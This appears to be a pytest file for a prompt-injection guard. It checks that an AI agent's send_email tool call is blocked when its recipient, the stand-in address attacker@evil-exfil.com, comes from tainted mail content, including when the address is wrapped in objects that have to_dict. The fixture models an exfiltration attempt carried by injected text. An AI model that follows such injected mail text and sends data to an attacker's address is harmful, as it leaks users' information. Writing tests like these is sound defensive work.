"""RED tests: collect_leaves walks an object with ``to_dict()`` as its mapping (twin of collectLeaves in provenance.ts).

The leaves, and the guard ruling they drive, must match what canonical_json already honours for such an object.
"""

from typing import Any

import pytest

from prompt_protection.guard._types import ToolCall
from prompt_protection.guard.guard import create_guard
from prompt_protection.guard.provenance import ArgLeaf, collect_leaves

ATTACKER = "attacker@evil-exfil.com"


class Mapped:
    def __init__(self, value: Any) -> None:
        self.value = value

    def to_dict(self) -> dict[str, Any]:
        return {"to": self.value}


def _blocked_args(args: dict[str, Any]) -> Any:
    guard = create_guard(sinks={"send_email": "email"})
    guard.taint("mail", f"Contact {ATTACKER} for the report")
    return guard.check_tool_call(ToolCall("send_email", args))


@pytest.mark.parametrize(
    "args",
    [{"msg": Mapped(ATTACKER)}, {"to": ATTACKER}, {"msg": {"inner": Mapped(ATTACKER)}}, {"msg": [Mapped(ATTACKER)]}],
    ids=["nested-object", "plain-mapping-control", "doubly-nested", "inside-list"],
)
def test_tainted_exfil_call_blocks_with_to_dict_object_in_args(args: dict[str, Any]) -> None:
    ruling = _blocked_args(args)
    assert ruling.action == "block"
    assert "untrusted-to-exfil-sink" in ruling.reasons


def test_top_level_to_dict_object_as_args_blocks() -> None:
    guard = create_guard(sinks={"send_email": "email"})
    guard.taint("mail", f"Contact {ATTACKER} for the report")
    ruling = guard.check_tool_call(ToolCall("send_email", Mapped(ATTACKER)))
    assert ruling.action == "block"
    assert "untrusted-to-exfil-sink" in ruling.reasons


def test_collect_leaves_of_to_dict_object_equals_leaves_of_its_mapping() -> None:
    assert collect_leaves(Mapped("v")) == collect_leaves({"to": "v"})
    assert collect_leaves(Mapped("v")) == [ArgLeaf("args.to", "to"), ArgLeaf("args.to", "v")]


def test_collect_leaves_of_nested_to_dict_object_takes_paths_from_mapping_keys() -> None:
    assert collect_leaves({"msg": Mapped("v")}) == collect_leaves({"msg": {"to": "v"}})
    assert collect_leaves({"msg": Mapped("v")}) == [
        ArgLeaf("args.msg", "msg"),
        ArgLeaf("args.msg.to", "to"),
        ArgLeaf("args.msg.to", "v"),
    ]
